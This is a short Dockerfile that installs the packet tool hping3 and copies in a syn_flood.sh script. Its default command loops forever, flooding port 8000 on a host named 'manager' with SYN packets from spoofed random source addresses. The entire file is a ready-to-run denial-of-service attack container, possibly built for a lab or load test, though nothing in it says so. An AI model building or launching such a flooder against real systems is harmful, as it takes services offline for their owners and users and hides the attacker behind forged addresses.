FROM python:3.12-slim
RUN apt-get update && \
    apt-get install -y --no-install-recommends hping3 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
COPY scripts/syn_flood.sh /syn_flood.sh
RUN chmod +x /syn_flood.sh
CMD ["sh", "-c", "while true; do hping3 -S -p 8000 --flood --rand-source manager; sleep 10; done"]